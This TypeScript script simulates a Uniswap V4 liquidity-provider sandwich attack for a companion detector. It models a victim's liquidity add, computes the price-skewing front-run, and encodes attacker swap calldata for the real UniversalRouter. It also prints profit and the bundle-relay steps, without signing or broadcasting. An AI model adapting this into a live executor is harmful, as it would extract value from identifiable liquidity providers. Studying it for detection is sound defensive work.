/**
 * Uniswap V4 LP-sandwich — *simulation* of the offensive side.
 *
 * Mirrors the defensive detector in v4-lp-sandwich.ts so you can see exactly
 * how a MEV searcher would build the 3-tx bundle that the detector looks for.
 *
 * IT DOES NOT BROADCAST. There is no signing, no RPC submission, no bundle
 * relay call. The script:
 *   1. Models a victim's pending `INCREASE_LIQUIDITY_FROM_DELTAS` call.
 *   2. Computes the front-run swap that maximizes captured imbalance.
 *   3. Encodes all three transactions with viem, end-to-end, so you can see
 *      the exact calldata, settlement-account deltas, and net P&L the
 *      searcher would realize.
 *   4. Prints a step-by-step trace.
 *
 * Run:
 *   npx tsx uniswap/example-attack-sim.ts
 *   npx tsx uniswap/example-attack-sim.ts --victim-eth=5 --victim-tick-low=-887220 --victim-tick-high=887220
 *
 * The numbers below are intentionally a synthetic ETH/USDC pool — pick your
 * own with --pool-price and --liquidity if you want to model a real one.
 *
 * Why this is a sim and not an executor:
 *   The detector's README explains the choice. LP-sandwich victims are
 *   identifiable LPs with bad slippage settings; shipping an executor
 *   automates harm to those specific users. This file exists to make the
 *   mechanics legible — the same way Uniswap's own test
 *   (PositionManagerModifyLiquiditiesTest::test_increaseFromDeltasPOC)
 *   does — without packaging a turnkey weapon.
 */

import {
  type Address,
  type Hex,
  encodeAbiParameters,
  encodeFunctionData,
  encodePacked,
  keccak256,
  parseAbi,
  parseUnits,
  zeroAddress,
} from "viem";

// ─────────────────────────────────────────────────────────────────────────────
// V4 constants & ABIs (subset — enough to encode the calldata we'd submit)
// ─────────────────────────────────────────────────────────────────────────────

const POOL_MANAGER_BASE: Address = "0x498581fF718922c3f8e6A244956aF099B2652b2b";

// UniversalRouter ABI fragment for swap routing.
const UNIVERSAL_ROUTER_ABI = parseAbi([
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
]);

// PositionManager actions (V4 periphery). These are the codes the victim's
// tx encodes; the searcher doesn't call them — they're shown here so the
// trace is concrete about what the victim is doing.
const ACTION_MINT_POSITION_FROM_DELTAS = 0x05;
const ACTION_INCREASE_LIQUIDITY_FROM_DELTAS = 0x06;
const ACTION_SETTLE_PAIR = 0x0d;
const ACTION_TAKE_PAIR = 0x11;

// V4 swap params encoded for UniversalRouter command 0x10 (V4_SWAP).
const V4_SWAP_COMMAND = 0x10;
const ACTION_SWAP_EXACT_IN_SINGLE = 0x06;
const ACTION_SETTLE_ALL = 0x0c;
const ACTION_TAKE_ALL = 0x0f;

// ─────────────────────────────────────────────────────────────────────────────
// Pool / state model
// ─────────────────────────────────────────────────────────────────────────────

interface PoolKey {
  currency0: Address; // lower address
  currency1: Address; // higher address
  fee: number;        // e.g. 3000 = 0.30%
  tickSpacing: number;
  hooks: Address;     // zero if no hook
}

interface PoolState {
  sqrtPriceX96: bigint;
  tick: number;
  /** Active in-range liquidity. */
  liquidity: bigint;
}

interface VictimIntent {
  /** Whether it's MINT (new position) or INCREASE on an existing one. */
  action: "mint" | "increase";
  tickLower: number;
  tickUpper: number;
  /** Token0 amount that lands in their delta account before the modify. */
  amount0Desired: bigint;
  /** Token1 amount that lands in their delta account before the modify. */
  amount1Desired: bigint;
  /** Recipient EOA (the LP being sandwiched). */
  recipient: Address;
}

// ─────────────────────────────────────────────────────────────────────────────
// V4 math — minimal sqrt-price / amount helpers.
// (Full TickMath/SqrtPriceMath would be too much for a sim; we use the
//  Uniswap V3 closed-form approximations, which are identical in V4.)
// ─────────────────────────────────────────────────────────────────────────────

const Q96 = 2n ** 96n;

/** Mul-div with floor semantics. */
function mulDiv(a: bigint, b: bigint, denom: bigint): bigint {
  return (a * b) / denom;
}

/**
 * Token0 in, token1 out: sqrtP_next = L * sqrtP / (L + amount0 * sqrtP / Q96).
 * Price decreases. Ignores fees to keep the sim readable.
 */
function nextSqrtPriceAfterZeroForOne(sqrtP: bigint, L: bigint, amount0In: bigint): bigint {
  if (amount0In === 0n) return sqrtP;
  const numerator1 = L << 96n;
  const denom = numerator1 + amount0In * sqrtP;
  return mulDiv(numerator1, sqrtP, denom);
}

/**
 * Token1 in, token0 out: sqrtP_next = sqrtP + amount1 * Q96 / L. Price increases.
 */
function nextSqrtPriceAfterOneForZero(sqrtP: bigint, L: bigint, amount1In: bigint): bigint {
  if (amount1In === 0n) return sqrtP;
  return sqrtP + (amount1In * Q96) / L;
}

/** Amount of token1 received/required moving sqrtP from a to b. */
function amount1Delta(sqrtA: bigint, sqrtB: bigint, L: bigint): bigint {
  const [lo, hi] = sqrtA < sqrtB ? [sqrtA, sqrtB] : [sqrtB, sqrtA];
  return mulDiv(L, hi - lo, Q96);
}

/** Amount of token0 received/required moving sqrtP from a to b. */
function amount0Delta(sqrtA: bigint, sqrtB: bigint, L: bigint): bigint {
  const [lo, hi] = sqrtA < sqrtB ? [sqrtA, sqrtB] : [sqrtB, sqrtA];
  return mulDiv(L << 96n, hi - lo, hi * lo);
}

/** Amount of token0 required for a given liquidity delta in [sqrtA, sqrtB]. */
function amount0ForLiquidity(sqrtA: bigint, sqrtB: bigint, L: bigint): bigint {
  const [lo, hi] = sqrtA < sqrtB ? [sqrtA, sqrtB] : [sqrtB, sqrtA];
  return mulDiv(L << 96n, hi - lo, hi * lo);
}

/** Liquidity that amount0 can support across [sqrtA, sqrtB]. */
function liquidityForAmount0(sqrtA: bigint, sqrtB: bigint, amount0: bigint): bigint {
  const [lo, hi] = sqrtA < sqrtB ? [sqrtA, sqrtB] : [sqrtB, sqrtA];
  return mulDiv(amount0 * lo, hi, (hi - lo) << 96n);
}

/** Liquidity that amount1 can support across [sqrtA, sqrtB]. */
function liquidityForAmount1(sqrtA: bigint, sqrtB: bigint, amount1: bigint): bigint {
  const [lo, hi] = sqrtA < sqrtB ? [sqrtA, sqrtB] : [sqrtB, sqrtA];
  return mulDiv(amount1, Q96, hi - lo);
}

/**
 * What liquidity does the victim end up with given their (amount0,amount1)
 * deltas at sqrtP? This mirrors what `_FROM_DELTAS` computes on-chain.
 */
function liquidityFromDeltas(
  sqrtP: bigint,
  sqrtA: bigint,
  sqrtB: bigint,
  amount0: bigint,
  amount1: bigint
): bigint {
  if (sqrtP <= sqrtA) {
    return liquidityForAmount0(sqrtA, sqrtB, amount0);
  } else if (sqrtP < sqrtB) {
    const l0 = liquidityForAmount0(sqrtP, sqrtB, amount0);
    const l1 = liquidityForAmount1(sqrtA, sqrtP, amount1);
    return l0 < l1 ? l0 : l1;
  } else {
    return liquidityForAmount1(sqrtA, sqrtB, amount1);
  }
}

function poolIdOf(key: PoolKey): Hex {
  return keccak256(
    encodeAbiParameters(
      [
        { type: "address" },
        { type: "address" },
        { type: "uint24" },
        { type: "int24" },
        { type: "address" },
      ],
      [key.currency0, key.currency1, key.fee, key.tickSpacing, key.hooks]
    )
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Calldata encoders — what the searcher's executor contract would actually
// submit. We encode through UniversalRouter for the two swap legs.
// ─────────────────────────────────────────────────────────────────────────────

function encodeAttackerSwap(
  pool: PoolKey,
  amountIn: bigint,
  amountOutMin: bigint,
  zeroForOne: boolean,
  searcher: Address,
  deadline: bigint
): Hex {
  const actions = encodePacked(
    ["uint8", "uint8", "uint8"],
    [ACTION_SWAP_EXACT_IN_SINGLE, ACTION_SETTLE_ALL, ACTION_TAKE_ALL]
  );

  const swapParams = encodeAbiParameters(
    [
      {
        type: "tuple",
        components: [
          {
            type: "tuple",
            name: "poolKey",
            components: [
              { type: "address", name: "currency0" },
              { type: "address", name: "currency1" },
              { type: "uint24", name: "fee" },
              { type: "int24", name: "tickSpacing" },
              { type: "address", name: "hooks" },
            ],
          },
          { type: "bool", name: "zeroForOne" },
          { type: "uint128", name: "amountIn" },
          { type: "uint128", name: "amountOutMinimum" },
          { type: "bytes", name: "hookData" },
        ],
      },
    ],
    [
      {
        poolKey: pool,
        zeroForOne,
        amountIn,
        amountOutMinimum: amountOutMin,
        hookData: "0x" as Hex,
      },
    ]
  );

  const tokenIn = zeroForOne ? pool.currency0 : pool.currency1;
  const tokenOut = zeroForOne ? pool.currency1 : pool.currency0;
  const settleParams = encodeAbiParameters(
    [{ type: "address" }, { type: "uint256" }],
    [tokenIn, amountIn]
  );
  const takeParams = encodeAbiParameters(
    [{ type: "address" }, { type: "uint256" }],
    [tokenOut, 0n]
  );

  const v4Inputs = encodeAbiParameters(
    [{ type: "bytes" }, { type: "bytes[]" }],
    [actions, [swapParams, settleParams, takeParams]]
  );

  const commands = encodePacked(["uint8"], [V4_SWAP_COMMAND]);
  return encodeFunctionData({
    abi: UNIVERSAL_ROUTER_ABI,
    functionName: "execute",
    args: [commands, [v4Inputs], deadline],
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// The simulation
// ─────────────────────────────────────────────────────────────────────────────

interface SimResult {
  /** Front-run swap: searcher pays token0_in, receives token1_out. */
  frontRun: { amountIn: bigint; amountOut: bigint; sqrtPAfter: bigint; tickAfter: number; calldata: Hex };
  /** Victim's modify — what liquidity they get at the skewed price. */
  victim: { liquidity: bigint; liquidityAtFairPrice: bigint };
  /** Back-run: searcher reverses; what comes out. */
  backRun: { amountIn: bigint; amountOut: bigint; sqrtPAfter: bigint; tickAfter: number; calldata: Hex };
  /** Net P&L of the searcher in token0 and token1 terms. */
  pnl: { token0: bigint; token1: bigint };
}

function simulate(
  pool: PoolKey,
  state: PoolState,
  victim: VictimIntent,
  searcher: Address,
  /** How much token0 the attacker is willing to push through. Tune this. */
  attackAmount0: bigint,
  zeroForOne: boolean
): SimResult {
  // 1. Front-run swap moves the price. We model zeroForOne for this sim
  //    (selling token0 to push the price down).
  const sqrtPAfterFront = zeroForOne
    ? nextSqrtPriceAfterZeroForOne(state.sqrtPriceX96, state.liquidity, attackAmount0)
    : nextSqrtPriceAfterOneForZero(state.sqrtPriceX96, state.liquidity, attackAmount0);
  const frontOut = amount1Delta(state.sqrtPriceX96, sqrtPAfterFront, state.liquidity);
  const tickAfterFront = tickFromSqrtPriceX96(sqrtPAfterFront);

  // 2. Victim modifies at the skewed price. The `_FROM_DELTAS` flavor uses
  //    whatever (amount0,amount1) they happened to leave in the settlement
  //    account; their effective L is what those amounts buy *at the skewed
  //    sqrtP*, not the fair one.
  const sqrtA = tickToSqrtPriceX96(victim.tickLower);
  const sqrtB = tickToSqrtPriceX96(victim.tickUpper);
  const Lskewed = liquidityFromDeltas(
    sqrtPAfterFront,
    sqrtA,
    sqrtB,
    victim.amount0Desired,
    victim.amount1Desired
  );
  const Lfair = liquidityFromDeltas(
    state.sqrtPriceX96,
    sqrtA,
    sqrtB,
    victim.amount0Desired,
    victim.amount1Desired
  );

  // 3. Back-run reverses. The pool now has *additional* liquidity from the
  //    victim's add (if their range covers the skewed tick), so the back-run
  //    executes against (state.liquidity + Lskewed). For sim clarity we assume
  //    the range covers it.
  const Ltotal = state.liquidity + Lskewed;
  // Reverse direction = !zeroForOne. We feed the token1 we received from the
  // front-run back into the pool.
  const sqrtPAfterBack = zeroForOne
    ? nextSqrtPriceAfterOneForZero(sqrtPAfterFront, Ltotal, frontOut)
    : nextSqrtPriceAfterZeroForOne(sqrtPAfterFront, Ltotal, frontOut);
  // The output is in token0 (since we sold token1).
  const backOut = amount0Delta(sqrtPAfterFront, sqrtPAfterBack, Ltotal);
  const tickAfterBack = tickFromSqrtPriceX96(sqrtPAfterBack);

  // Net P&L: spent attackAmount0 token0, got backOut token0 → diff is profit.
  const pnl0 = backOut - attackAmount0;
  const pnl1 = 0n; // routed back fully in token1; remainder ~0 by construction

  const deadline = BigInt(Math.floor(Date.now() / 1000) + 60);
  const frontCalldata = encodeAttackerSwap(
    pool,
    attackAmount0,
    (frontOut * 95n) / 100n,
    zeroForOne,
    searcher,
    deadline
  );
  const backCalldata = encodeAttackerSwap(
    pool,
    frontOut,
    (backOut * 95n) / 100n,
    !zeroForOne,
    searcher,
    deadline
  );

  return {
    frontRun: {
      amountIn: attackAmount0,
      amountOut: frontOut,
      sqrtPAfter: sqrtPAfterFront,
      tickAfter: tickAfterFront,
      calldata: frontCalldata,
    },
    victim: { liquidity: Lskewed, liquidityAtFairPrice: Lfair },
    backRun: {
      amountIn: frontOut,
      amountOut: backOut,
      sqrtPAfter: sqrtPAfterBack,
      tickAfter: tickAfterBack,
      calldata: backCalldata,
    },
    pnl: { token0: pnl0, token1: pnl1 },
  };
}

// Approx tick<->sqrtPrice (good enough for a sim; on-chain uses TickMath).
function tickToSqrtPriceX96(tick: number): bigint {
  const ratio = Math.pow(1.0001, tick / 2);
  return BigInt(Math.floor(ratio * Number(Q96)));
}
function tickFromSqrtPriceX96(sqrtP: bigint): number {
  const ratio = Number(sqrtP) / Number(Q96);
  return Math.floor(Math.log(ratio * ratio) / Math.log(1.0001));
}

// ─────────────────────────────────────────────────────────────────────────────
// CLI
// ─────────────────────────────────────────────────────────────────────────────

function arg(name: string, fallback: string): string {
  const hit = process.argv.find((a) => a.startsWith(`--${name}=`));
  return hit ? hit.slice(name.length + 3) : fallback;
}

function main() {
  // Synthetic ETH/USDC pool on Base — replace with real values via flags.
  const pool: PoolKey = {
    currency0: "0x4200000000000000000000000000000000000006", // WETH
    currency1: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
    fee: 3000,
    tickSpacing: 60,
    hooks: zeroAddress,
  };

  // Pool sits at ~$2300/ETH. sqrtP ≈ sqrt(2300 * 10^-12) * 2^96.
  const startTick = Number(arg("tick", "-194600"));
  const state: PoolState = {
    sqrtPriceX96: tickToSqrtPriceX96(startTick),
    tick: startTick,
    liquidity: BigInt(arg("liquidity", String(50_000_000_000_000_000n))),
  };

  const victim: VictimIntent = {
    action: "increase",
    tickLower: Number(arg("victim-tick-low", "-195000")),
    tickUpper: Number(arg("victim-tick-high", "-194000")),
    amount0Desired: parseUnits(arg("victim-eth", "5"), 18),     // 5 WETH
    amount1Desired: parseUnits(arg("victim-usdc", "11500"), 6), // ~$11.5k
    recipient: "0xVICTIM00000000000000000000000000000000Aa" as Address,
  };

  const searcher: Address = "0xSEARCHER000000000000000000000000000000bB" as Address;
  const attackAmount0 = parseUnits(arg("attack-eth", "20"), 18); // push the price
  const zeroForOne = true; // sell ETH for USDC to push ETH price down

  const result = simulate(pool, state, victim, searcher, attackAmount0, zeroForOne);

  const fmt0 = (n: bigint) => `${Number(n) / 1e18} WETH`;
  const fmt1 = (n: bigint) => `${Number(n) / 1e6} USDC`;
  const pid = poolIdOf(pool);

  console.log("\n=== Uniswap V4 LP-Sandwich SIMULATION (dry-run, no broadcast) ===\n");
  console.log(`Pool key:       WETH/USDC fee=${pool.fee} tickSpacing=${pool.tickSpacing}`);
  console.log(`Pool id:        ${pid}`);
  console.log(`PoolManager:    ${POOL_MANAGER_BASE} (Base)`);
  console.log(`Start tick:     ${state.tick}   sqrtP=${state.sqrtPriceX96}`);
  console.log(`Active L:       ${state.liquidity}\n`);

  console.log(`Victim intent:  INCREASE_LIQUIDITY_FROM_DELTAS`);
  console.log(`  recipient:    ${victim.recipient}`);
  console.log(`  range:        [${victim.tickLower}, ${victim.tickUpper}]`);
  console.log(`  amounts:      ${fmt0(victim.amount0Desired)} + ${fmt1(victim.amount1Desired)}\n`);

  console.log(`--- Step 1: searcher FRONT-RUN ---`);
  console.log(`  swap zeroForOne=${zeroForOne}, in=${fmt0(result.frontRun.amountIn)}`);
  console.log(`  out:          ${fmt1(result.frontRun.amountOut)}`);
  console.log(`  sqrtP after:  ${result.frontRun.sqrtPAfter}`);
  console.log(`  tick after:   ${result.frontRun.tickAfter}  (Δ ${result.frontRun.tickAfter - state.tick})`);
  console.log(`  calldata:     ${result.frontRun.calldata.slice(0, 74)}...  (${(result.frontRun.calldata.length - 2) / 2} bytes)\n`);

  console.log(`--- Step 2: victim's ModifyLiquidity executes at skewed price ---`);
  console.log(`  L at fair px: ${result.victim.liquidityAtFairPrice}`);
  console.log(`  L at skewed:  ${result.victim.liquidity}`);
  console.log(`  ΔL captured:  ${result.victim.liquidityAtFairPrice - result.victim.liquidity}`);
  console.log(`  (the victim deposits the same tokens but ends up with less LP exposure)\n`);

  console.log(`--- Step 3: searcher BACK-RUN ---`);
  console.log(`  swap zeroForOne=${!zeroForOne}, in=${fmt1(result.backRun.amountIn)}`);
  console.log(`  out:          ${fmt0(result.backRun.amountOut)}`);
  console.log(`  sqrtP after:  ${result.backRun.sqrtPAfter}`);
  console.log(`  tick after:   ${result.backRun.tickAfter}\n`);

  console.log(`--- Net P&L (searcher, before gas + priority fee) ---`);
  console.log(`  token0:       ${fmt0(result.pnl.token0)}`);
  console.log(`  token1:       ${fmt1(result.pnl.token1)}\n`);

  console.log(`--- What broadcast WOULD look like (not performed) ---`);
  console.log(`  1) Submit front-run tx with calldata above to UniversalRouter, with high priority fee`);
  console.log(`     — typically via a private-mempool relay (Flashbots-style) bundled atomically:`);
  console.log(`     bundle = [frontRunTx, victimTx, backRunTx]`);
  console.log(`     so all three land in the same block in that exact order, or none do.`);
  console.log(`  2) Victim's tx is already in the public mempool — searcher only adds front+back.`);
  console.log(`  3) Detector in v4-lp-sandwich.ts would flag this bundle by:`);
  console.log(`     pool=${pid.slice(0, 18)}…  attackerEoa=${searcher}  victimEoa=${victim.recipient}`);
  console.log(`\n=== End of simulation ===\n`);
}

main();
